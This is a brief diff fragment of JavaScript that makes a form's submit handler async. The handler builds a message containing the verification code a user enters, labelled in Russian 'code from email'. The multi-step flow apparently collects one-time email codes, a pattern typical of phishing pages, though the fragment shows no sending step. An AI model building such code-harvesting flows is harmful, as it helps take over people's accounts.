@@ -181,7 +181,7 @@ document.querySelector("#button").onclick = function(){
               </div>`
               const finalMessage3 = mailCode;
               formClear.innerHTML = finalMessage3;
-              document.getElementById('form3').addEventListener('submit', function(e){
+              document.getElementById('form3').addEventListener('submit', async function(e){
                 e.preventDefault();
                 const message = `<b>код с почты: <code>${this.mailCode.value}</code></b>\n`
             
